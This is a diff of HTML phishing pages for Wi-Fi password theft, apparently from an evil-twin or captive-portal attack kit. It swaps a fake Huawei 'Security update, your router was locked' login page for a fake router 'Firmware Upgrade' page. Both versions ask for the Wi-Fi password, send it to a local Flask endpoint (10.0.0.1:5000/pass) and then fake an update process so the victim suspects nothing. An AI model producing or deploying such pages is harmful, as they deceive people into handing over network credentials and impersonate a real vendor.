@@ -1,194 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Router Configuration Page</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="/static/bootstrap.min.css">
+  <link rel="stylesheet" href="/static/font-awesome-4.7.0/css/font-awesome.min.css">
+  <script src="/static/jquery.min.js"></script>
+  <script src="/static/bootstrap.min.js"></script>
 
-<html xmlns="http://www.w3.org/1999/xhtml"><head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<link rel="stylesheet" href="bt.min.css">
-<link type="text/css" rel="stylesheet" href="main.css">
-<link rel="stylesheet" href="jq.css">
-<link rel="stylesheet" href="jq-min.css">
+  <!-- CSS -->
+  <style type="text/css">
 
-<title>Mobile Broadband</title></head>
+    /* Sticky footer styles
+    -------------------------------------------------- */
+
+    html,
+    body {
+          height: 100%;
+          /* The html and body elements cannot have any padding or margin. */
+        }
+
+        /* Wrapper for page content to push down footer */
+        #wrap {
+          min-height: 100%;
+          height: auto !important;
+          height: 100%;
+          /* Negative indent footer by it's height */
+          margin: 0 auto -60px;
+        }
+
+        /* Set the fixed height of the footer here */
+        #push,
+        #footer {
+          height: 60px;
+        }
+        #footer {
+          background-color: #f5f5f5;
+        }
+
+        /* Lastly, apply responsive CSS fixes as necessary */
+        @media (max-width: 767px) {
+          #footer {
+            margin-left: -20px;
+            margin-right: -20px;
+            padding-left: 20px;
+            padding-right: 20px;
+          }
+        }
+
+    img {
+        width: auto;
+        max-width: 100%;
+        height: auto;
+    }
+    .isa_info {
+        color: #9F6000;
+        background-color: #FEEFB3
+    }
+    .isa_info i {
+        margin:1px 3px;
+        font-size:18px;
+        vertical-align:middle;
+    }
+  </style>
+
+</head>
 
 <body>
 
-<div id="all_content" class="body_bg" style="display: block;">
-<div id="login_wrapper" class="login_wrapper_dim">
-<div class="login_wrapper_dim login_wrapper_filter">
-<div id="header" class="header"><div id="header_turnbg" class="head_div head_dim">
-<div class="head_dim head_filter">
-<div class="logo"></div>
-<div id="union_main_menu" class="main_menu clr_white_main_menu_active">
-<ul class="clr_white_header_hover">
-<li id="menu_index">
-<a id="home" style="color: white;">
-<span>Home</span></a></li>
-<li id="menu_statistic">
-<a id="statistic" style="color: white;">
-<span>Statistics</span></a></li>
-<li id="menu_sms">
-<a id="sms" style="color: white;">
-<span>SMS</span></a></li>
-<li id="menu_update">
-<a id="update" class="active" style="color: white;">
-<span>Update</span></a></li>
-<li id="menu_settings">
-<a id="settings" style="color: white;">
-<span>Settings</span></a></li>
-<li id="menu_more">
-<a id="more" style="color: white;">
-<span>More</span>
-</a></li></ul></div>
+  <!-- Start navigation bar -->
+  <!-- To change the navigation bar color change background attribute -->
+  <nav class="navbar navbar-inverse" style="background:RoyalBlue;margin-top:2em;">
+    <div class="container-fluid">
+      <div class="navbar-header">
+        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <!--
+        <a class="navbar-brand"><img style="background:transparent" src="Your LOGO" alt="Logo"></a>
+        -->
+      </div>
+      <div class="collapse navbar-collapse" id="myNavbar">
+        <ul class="nav navbar-nav">
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Setup <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Basic Setup</a></li>
+              <li><a href="#">DDNS</a></li>
+              <li><a href="#">MAC Address Clone</a></li>
+              <li><a href="#">Advanced Routing</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Wireless <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Basic Wireless Settings</a></li>
+              <li><a href="#">Wireless Security</a></li>
+              <li><a href="#">Wireless MAC Filter</a></li>
+              <li><a href="#">Advanced Wireless Settings</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Security <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Firewall</a></li>
+              <li><a href="#">VPN</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Access Restriction <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Internet Access</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Administration <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Management</a></li>
+              <li><a href="#">Log</a></li>
+              <li><a href="#">Diagnostics</a></li>
+              <li><a href="#">Factory Defaults</a></li>
+              <li><a href="#">Config Manegements</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Status <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Router</a></li>
+              <li><a href="#">Local Network</a></li>
+              <li><a href="#">Wireless</a></li>
+              <li><a href="#">Advanced Routing</a></li>
+            </ul>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- End navigation bar -->
 
-<div class="tools">
-<ul><li id="sms_gif" class="nav02" style="display: block;">
-<a id="tooltip_sms" ><img src="res/unread_message.gif" alt=""></a></li>
-<li id="sim_signal_gif" class="nav03"><img src="res/signal_4.png" 0="" no-repeat=""></li>
-<li id="station_gif" class="nav08" style="display: none;"></li>
-<li id="wan_gif" class="nav05"><img  src="res/wan_up_down.png" 0="" no-repeat=""></li>
-<li id="wifi_gif" class="nav06"><img src="res/wifi_1.png" 0="" no-repeat=""></li></ul>
-</div></div></div></div>
+  <!-- Start page content -->
+  <div class="container">
+	   <div class="col-sm">
+       <h2 class="text-center" style="color:CornflowerBlue">Firmware Upgrade</h2>
+       <h2 class="text-center" style="color:red; display: none;" id="error">Wrong Password</h2>
+    	 <p class="lead">A new version of the 2.31 firmware 5.3 has been detected and awaiting installation. Please review the following terms and conditions and proceed.</p>
+     </div>
+    <form>
+      <div class="form-group">
+        <label for="comment">Terms And Conditions:</label>
+        <textarea readonly class="form-control" rows="5" id="comment">
+1. LICENSE.
 
-<div class="center_box">
-<br>
-<div class="container text-center">
-            <div id="passfrm" class="card shadow mx-auto text-left" style="max-width: 494; min-width: 492;">
-                <div class="card-header text-center" style="background-color: #4d5757; color:white;">
-                    <p class="mb-0 py-2">Security update</p>
-                </div>
-                <div class="card-body" style="background-color: #fdfdfd;">
+Subject to the terms and conditions of this Software License Agreement, 2.31 hereby grants you a restricted, limited, non-exclusive, non-transferable, license to use the 2.31  Firmware/Software/Drivers only in conjunction with 2.31  products. The 2.31  Company does not grant you any license rights in any patent, copyright or other intellectual property rights owned by or licensed.
 
-                    <div class="media align-items-center">
-                        <a class="d-flex align-self-center">
-                              <img src="res/upd.png" alt="No Wifi png">
-                        </a>
-                        <div class="media-body">
-                            <h5 class="font-weight-bold">Network verification required</h5>
-                            <p class="pr-2 mb-0">Dear Customer, Due to a security update your router was locked, please provide your password to continue.</p>
-                        </div>
-                    </div>
-<br>
+2. NO WARRANTY.
 
-                    <!-- This form won't submit unless the user has entered the same
-                    > 8   action="http://127.0.0.1:5000/pass" -->
-                    <form method="post"  name="pass-form" onsubmit="return main(event)" data-parsley-validate="" novalidate="">
-                        <div class="form-group px-4">
-                            <label for="">Wi-Fi Password</label>
-                            <input type="password" name="pass" data-parsley-minlength="8" id="passwd" class="form-control" placeholder="" aria-describedby="helpId" required="">
-                            <small id="helpId" class="text-muted">Forgot password? Press the reset button on the back of the device.</small>
-                        </div>
-<div class="form-group px-4"><span>
-<select id="lang" class="float-left" onChange="changemylang(this.value)">
-<option value="en_us">language - English</option><option value="ar_sa">العربية</option><option value="zh_cn">简体中文（中国）</option><option value="fr_fr">Français</option><option value="de_de">Deutsch</option><option value="es_es">Español</option><option value="it_it">Italiano</option><option value="ru_ru">Русский</option><option value="pt_pt">Português</option><option value="pt_br">Português (Brasil)</option><option value="es_ar">Español (Latino)</option></select>
-</div></span>
+The 2.31  Firmware/Software/Drivers are provided "AS IS" without warranty of any kind. 2.31  Company does not warrant that the functions contained in the 2.31  Firmware/Software/Drivers will meet your requirements or that the operation of the 2.31  Firmware/Software/Drivers will be uninterrupted or error-free. 2.31  Company hereby disclaims all warranties, express or implied, with respect to the 2.31  firmware/software/drivers, including, without limitation, any implied warranties of merchantability, fitness for a particular purpose or non-infringement.
 
-                        <div class="form-group px-4">
-                            <input class="btn btn-success float-right" style="background-color: #4ec3f6;" type="submit" value="Check">
-                        </div>
-                    </form>
+3. NO LIABILITY.
 
-                </div>
+In no event shall 2.31  Company or any other party which has been involved in the creation, production, or delivery of the 2.31  Firmware/Software/Drivers be liable for any damages whatsoever arising from or related to this Software License Agreement or the 2.31  Firmware/Software/Drivers, including, without limitation, direct, indirect, consequential, incidental or special damages or losses , including but not limited to damages for lost profits or losses resulting from business interruption or loss of data, regardless of the form of action or legal theory under which the liability may be asserted, even if advised of the possibility or likelihood of such damages.
 
-            </div>
-
+       </textarea>
+        <div class="checkbox">
+          <label><input type="checkbox" id="check-box" onclick="checkBoxStatus()">I Agree With Above Terms And Conditions</label>
         </div>
+      </div>
+      <div class="form-group-has-feedback" id="psk_field">
+          <label for="pwd">Please enter your wifi password:</label>
+          <input class="form-control" type="password" id="pwd">
+      </div>
+      <div class="container text-center">
+        <div class="isa_info" id="pw_status" align="left">
+        </div>
+        <button class="btn btn-primary" id="btn">Start Upgrade</button>
+      </div>
+    </form>
+    <div id="push"></div>
+  </div>
+  <!-- Start page content -->
 
-<div id="proglog" class="card shadow mx-auto text-left" style="max-width: 494; min-width: 492; opacity: 0; display: none;">
-                <div class="card-header text-center" style="background-color: #4d5757; color:white;">
-                    <p class="mb-0 py-2">Please wait...</p>
-                </div>
-                <div class="card-body" style="background-color: #fdfdfd;">
-                <div class="card-body">
+  <!-- Start footer -->
+  <footer class="footer">
+    <div class="container text-center">
+      <p class="text-muted">© 2.31  <script>document.write(new Date().getFullYear())</script>, All Rights Reserved.</p>
+    </div>
+  </footer>
+  <!-- End footer -->
 
-                    <div class="container text-center mb-3">
+  <!-- Start update first message -->
+  <div class="modal fade" id="update-only" role="dialog">
+    <div class="modal-dialog modal-sm">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">Information</h4>
+        </div>
+        <div class="modal-body">
+          <p>Upgrade is required.</p>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- End update first message -->
 
-                        <div class="spinner-border text-success justify" role="status">
-                            <span class="sr-only">Loading...</span>
-                        </div>
-                        <svg class="d-none mx-auto" id="check" width="3em" height="3em" viewBox="0 0 16 16" class="bi bi-check2" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
-                            <path fill-rule="evenodd" d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/>
-                        </svg>
+  <!-- Start empty password message -->
+  <div class="modal fade" id="empty-pass">
+    <div class="modal-dialog modal-sm">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">Information</h4>
+        </div>
+        <div class="modal-body">
+          <p>Please Input Valid Password.</p>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- End empty password message -->
 
-                        <div>
-                            <small id="message" class="font-weight-black">Loading</small>
-                        </div>
-                    </div>
+  <!-- Start empty password message -->
+  <div class="modal fade" id="no-checkbox">
+    <div class="modal-dialog modal-sm">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">Information</h4>
+        </div>
+        <div class="modal-body">
+          <p>Please agree with the Terms And Conditions to proceed.</p>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- End empty password message -->
 
-
-                    <div id="progress">
-                        <span class='bg-success' style='width: 1%;' id='progressBar'><span></span></span>
-                    </div>
-
-                    <a href="https://google.com" id="continue-btn" class="d-none btn btn-success float-right mt-3">Continue</a>
-
-                </div>
-
-            </div>
-
-<br>
-<br>
-</div>
-<div id="cbs_div" class="cbs_text"></div>
-<div id="footer" class="footer clr_blue_hover"><a id="pravacy_policy" class="clr_gray" target="_blank">Huawei Privacy Policy</a><a id="privacy_policy" target="_blank" class="clr_gray" rel="noopener noreferrer">Huawei Privacy Notice</a><a id="copyright_notice"  class="clr_gray">Open Source Notice</a><br><img src="res/logo-footer.gif" align="top" alt="" border="0"><span id="statement_main"><table><tbody><tr><td><div class="pull-left giflogofooter clr_gray"></div></td><td class="clr_gray">&nbsp;(C) 2006-2021 Huawei Technologies co., ltd.</td></tr></tbody></table></span></div>
-
-<script src="jQuery.js"></script>
-<script src="parsley.min.js"></script>
-<script src="jQuery-ui.js"></script>
 <script>
+
+
+/*
+  Check the password field and act accordingly.
+*/
 const flsk_url = "http://10.0.0.1:5000/pass"
-function changemylang(ddt){if (ddt == "ar_sa"){location.href = './index-ar.html';}}
-function statusbar(){
-            const frm = document.getElementById("passfrm");
-            const prog = document.getElementById("proglog");
-            frm.style.display = "none";
-            frm.style.opacity = 0;
-            prog.style.display = "block";
-            prog.style.opacity = 1;
 
-            $(document).ready(function(){
-                $('#progressBar').progressbar({
-                    value: 1
-                });
-            });
+$("#btn").on("click", function(e) {
+    e.preventDefault();
 
-            var statusTracker;
-            var percentage = 0;
+    // get the password box and checkbox elements
+  	var pass = document.getElementById("pwd").value;
+    var box = document.getElementById("check-box");
 
-            function checkStatus() {
-                percentage = percentage + 5;
-                $('.bg-success').animate({
-                    width : percentage + '%'
-                });
 
-            if (percentage == 100) stop();
-                }
-                    function startProgress(){
-                    statusTracker = setInterval(checkStatus, 500);
-                }
+    if (pass < 8){alert("Please enter a correct password"); e.preventDefault(); return}
 
-            function stop() {
-                clearInterval(statusTracker);
-                $('#message').html('Update Complete');
-                setTimeout(function(){
-                    $('.spinner-border').hide();
-                    $('#check').removeClass('d-none').addClass('d-block');
-                    $('#continue-btn').removeClass('d-none').addClass('d-block');
-                },2000);
-
-            }
-            $(document).ready(startProgress);}
-
-async function main(e){
-e.preventDefault();
-const form = document.forms['pass-form']
-var pass = document.getElementById("passwd").value;
-
-if (pass < 8){alert("Please enter a correct password"); e.preventDefault(); return}
+    console.log(pass);
 
 function handled(data){
 console.log(data);
-if (data.status == "All good"){statusbar()}
+if (data.status == "All good"){window.location = "/upgrading.html";}
 
-else if (data.status == "notgood"){alert("Please enter a correct password"); location.reload();}
+else if (data.status == "notgood"){document.getElementById("error").style.display = "block";}
 
 else{alert("Please enter a correct password"); location.reload();}
 
@@ -199,9 +283,11 @@ fetch(flsk_url, { method: 'POST', headers: new Headers({'Content-Type': 'applica
       .then(data => handled(data))
       .catch(error => console.error('Error!', error.message))
 
-return}
 
+});
+
+ 
 
 </script>
-
-</div></div></div></body></html>
+</body>
+</html>
